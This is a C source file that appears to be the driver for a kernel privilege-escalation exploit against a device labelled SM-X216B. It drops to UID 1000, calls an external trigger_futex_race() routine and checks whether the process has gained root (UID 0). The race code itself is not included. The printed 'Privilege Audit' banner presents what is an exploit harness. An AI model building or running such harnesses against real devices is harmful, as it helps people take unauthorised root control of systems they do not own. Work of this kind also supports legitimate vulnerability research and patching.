#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/types.h>

extern int trigger_futex_race(void);

int main(void) {
    /* 1. Mount proc explicitly prior to credential modification */
    mount("proc", "/proc", "proc", 0, NULL);

    printf("==========================================\n");
    printf("  SM-X216B — Restricted Privilege Audit    \n");
    printf("==========================================\n");
    
    /* 2. FORCE DROP PRIVILEGES to an unprivileged daemon user (UID 1000 / GID 1000) */
    setgid(1000);
    setuid(1000);

    /* 3. Verify that the privilege drop took effect */
    uid_t pre_uid = getuid();
    uid_t pre_euid = geteuid();
    printf("[PRE-CHECK] Restricted Real UID: %d, Eff UID: %d\n", (int)pre_uid, (int)pre_euid);
    fflush(stdout);

    if (pre_uid != 1000) {
        printf("[ERROR] Failed to drop privileges. Aborting test to prevent false positive.\n");
        return 1;
    }

    /* 4. Trigger the exploit state machine from an unprivileged context */
    trigger_futex_race();
    usleep(500000);
    
    printf("\n[!] Initialising Independent Kernel-State Audit...\n");
    uid_t post_uid = getuid();
    uid_t post_gid = getgid();
    printf("[VERIFICATION] Real System Call UID: %d\n", (int)post_uid);
    printf("[VERIFICATION] Real System Call GID: %d\n", (int)post_gid);
    
    if (post_uid == 0) {
        printf("[VERIFICATION] SUCCESS: TRUE primitive elevation verified from UID 1000 to 0!\n");
    } else {
        printf("[VERIFICATION] FAILURE: Process remained unprivileged inside the baseline sandbox.\n");
    }
    
    fflush(stdout);
    return 0;
}
